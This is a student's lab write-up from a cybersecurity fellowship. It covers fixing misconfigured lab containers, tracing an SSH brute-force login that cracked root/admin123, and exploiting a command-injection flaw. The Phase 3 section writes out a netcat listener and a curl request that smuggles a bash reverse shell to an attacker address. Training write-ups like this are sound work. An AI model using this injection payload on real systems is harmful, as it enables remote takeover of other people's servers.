# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** Isabelli Duran
**Date:** May 28, 2026
**Repository:** https://github.com/isabelli0056-maker/Phase-1-TKH
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
Our initial automated network scan discovered three active systems with critical security gaps. The first two systems left sensitive database and file-sharing doors wide open to the network without requiring any password verification. 
The third system had no exposed network doors, but an internal check revealed that its private security log folder was misconfigured, allowing any standard user to read or modify its contents.

### Breach Network — 172.80.0.0/24
Security mapping on this second network segment located a single active system running a standard remote-login connection service. 
A deeper inspection revealed that this login interface lacks basic protective barriers, such as a limit on how many times a user can guess a password or a requirement for secure digital keys. 
Because of these missing safeguards, we determined that this system is highly vulnerable to an automated, rapid password-guessing attack.

### Exploitation Network — 172.60.0.0/24
Our investigation of the final network segment identified an active website server running on standard, unencrypted web traffic. 
We discovered a fundamental design flaw where the website directly passes whatever a visitor types into its input boxes straight into the server's master operating system. 
This severe oversight means a malicious actor could easily bypass security boundaries, input destructive commands, and take complete control of the system from a remote location.

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:**
An unprotected database service (Redis) was found running on network port 6379. Our automated network scan confirmed that the database was completely exposed to the network and accepting connections without asking for a password or authentication.

**Remediation Commands:**
docker exec -it broken_server_1 /bin/sh
iptables -A INPUT -p tcp --dport 6379 -s 172.100.0.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 6379 -j DROP
exit

**Before State:**
The database port (6379) was wide open to any external traffic, allowing any system on the network to freely read, write, or delete our data.

**After State:**
The database port is securely restricted. Only trusted devices on the local triage network segment (172.100.0.0/24) can access the database, while all other public requests are immediately dropped.

**Analysis:**
Leaving a database fully exposed to an untrusted network presents an immediate operational threat by bypassing traditional corporate security perimeters. In professional environments, unauthenticated database endpoints are frequently targeted by automated ransomware scripts that systematically delete business records to disrupt operations. Consequently, enforcing strict network-level restriction lists is a critical requirement for safeguarding the data confidentiality of an organization.

### Server 2 — 172.100.0.12
**Vulnerability Identified:**
An unauthorized file-sharing service (FTP) was found running silently inside the server on network port 21. We confirmed this issue by checking active network ports, which pinpointed the rogue process running under process identification number 21.

**Remediation Commands:**
docker exec -it broken_server_2 /bin/bash
ss -ltnp | grep :21
kill -9 21
exit

**Before State:**
The unapproved file service was actively running and listening on port 21, leaving a backdoor open for unauthorized file transfers.

**After State:**
The unauthorized service has been terminated, the networking port is completely closed, and the container environment is safely shut down.

**Analysis:**
The presence of unapproved file-sharing programs within a corporate network generally indicates a breakdown in software asset tracking or an active malware infection. Rogue communication tools are routinely established by malicious actors to create hidden data channels that quietly bypass traditional enterprise security monitoring.
Safely terminating these unapproved background services is vital for maintaining corporate compliance and preventing intellectual property from being stolen.

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
The public website storage directory (/var/www/html) was configured with dangerous, wide-open public write privileges. Our system folder audit flagged the directory as world-writable, allowing any low-privilege user or script on the machine to modify web files.

**Remediation Commands:**
docker exec -it broken_server_3 /bin/sh
chmod 755 /var/www/html
exit

**Before State:**
The website root directory was configured with wide-open permissions (777 / drwxrwxrwx), allowing any local account to delete, change, or overwrite the site's files.

**After State:**
The directory permissions have been locked down to a secure, standard configuration (755 / drwxr-xr-x), ensuring only the root administrator can edit files, while others can only view them.

**Analysis:**
Weak folder permissions on public-facing web servers present an immediate business risk by allowing low-privilege accounts or local processes to alter web content. 
Adversaries frequently exploit world-writable web paths to deface corporate websites, upload malicious phishing pages, or plant persistent digital backdoors that target site visitors. Maintaining strict access control permissions over production web folders is fundamental to protecting an organization's public reputation and ensuring overall system integrity.

---

## Phase 2: The Breach

**Cracked Credentials:**
- Username: root
- Password: admin123

**Forensic Evidence:**
- Exact Timestamp of Successful Login: May 28 02:12:15 UTC
- Attacker IP Address: 172.80.0.1

**Engineered iptables Rule:**
iptables -A INPUT -s 172.80.0.1 -j DROP

**SOC Analysis:**
A single iptables block rule is insufficient as a standalone defensive measure because sophisticated threat actors can easily bypass static IP filters by rotating their source addresses through virtual private networks or proxy chains. Consequently, a modern Security Operations Center (SOC) must deploy multi-layered controls, including automated SIEM correlation rules to detect persistent authentication anomalies and multi-factor authentication (MFA) to neutralize credential abuse (Sutton & Peterson, 2024).

---

## Phase 3: Full Spectrum

**Listener Configuration:**
Tool: netcat (nc)

Port: 4444 (or any high-numbered open port)

Command: nc -lvnp 4444

**Reverse Shell Payload:**
curl "http://172.60.0.10/?ip=127.0.0.1;bash -i >& /dev/tcp/172.60.0.1/4444 0>&1"

**Command Injection Explanation:**
Command injection occurs when an application passes unsanitized user-supplied input—such as form data or HTTP headers—directly to a system shell for execution. This vulnerability allows an adversary to manipulate the intended command logic, enabling the execution of arbitrary system-level instructions with the privileges of the web server.

**Forensic Evidence:**
- Process ID (PID): 1
- User-Agent: unknown

**Lockdown Command:**
sudo iptables -A INPUT -p tcp --dport 80 -j DROP

**Final Analytical Paragraph:**
Playing both sides of this operation demonstrates that security is an asymmetric battle where the attacker only needs one misconfiguration to succeed, while the defender must secure the entire perimeter. The primary lesson is that input validation is the foundational barrier against application-level attacks; without it, all other security controls become reactive rather than preventative. The single defensive control that would have stopped this breach entirely is input sanitization and the implementation of a whitelist-based validation policy. By stripping all metacharacters (such as ;, |, &, and $) from user inputs before they reach the execution environment, the application renders command injection payloads inert, effectively closing the vector before execution occurs.

---

## References
OWASP Foundation. (2025). Command Injection. https://owasp.org/www-community/attacks/Command_Injection

The Netcat Project. (2025). nc: Arbitrary TCP and UDP connections and listens. https://nc110.sourceforge.io/
